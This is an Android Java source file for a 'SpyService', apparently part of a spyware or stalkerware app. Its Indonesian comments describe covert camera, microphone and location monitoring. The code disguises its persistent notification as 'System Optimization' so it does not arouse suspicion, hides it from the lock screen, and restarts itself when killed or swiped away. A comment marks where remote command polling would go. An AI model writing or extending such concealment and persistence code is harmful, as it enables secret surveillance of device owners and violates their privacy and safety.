package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

/**
 * SpyService: Layanan inti untuk operasi sensitif (Camera, Mic, Location)
 * Didesain untuk persistensi tinggi di latar belakang.
 */
public class SpyService extends Service {
    private static final String TAG = "CRPT.SpyService";
    private static final String CHANNEL_ID = "SpySystemChannel";
    private static final int NOTIFICATION_ID = 2009;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "SpyService started...");

        // Konfigurasi Foreground Service untuk Android 10 (API 29) sampai Android 14+ (API 34)
        // Sesuai Manifest: location, camera, microphone, specialUse
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14
            startForeground(NOTIFICATION_ID, getNotification(), 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // Android 11 - 13
            startForeground(NOTIFICATION_ID, getNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(NOTIFICATION_ID, getNotification());
        }

        // Jalankan tugas pemantauan di sini (looping socket atau polling command)
        
        return START_STICKY; // Agar otomatis restart jika dibunuh sistem
    }

    private Notification getNotification() {
        // Notifikasi dibuat samar agar tidak mencurigakan di tray
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Optimization")
                .setContentText("Processing system resources...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true);

        return builder.build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Engine Service",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Layanan tidak terikat (unbound)
    }

    @Override
    public void onDestroy() {
        // Trigger Restarter agar service bangun lagi
        Intent restartIntent = new Intent();
        restartIntent.setAction("RestartSpyService");
        restartIntent.setClass(this, RestarterReceiver.class);
        this.sendBroadcast(restartIntent);
        
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Proteksi ekstra saat aplikasi di-swipe dari recent apps
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }
}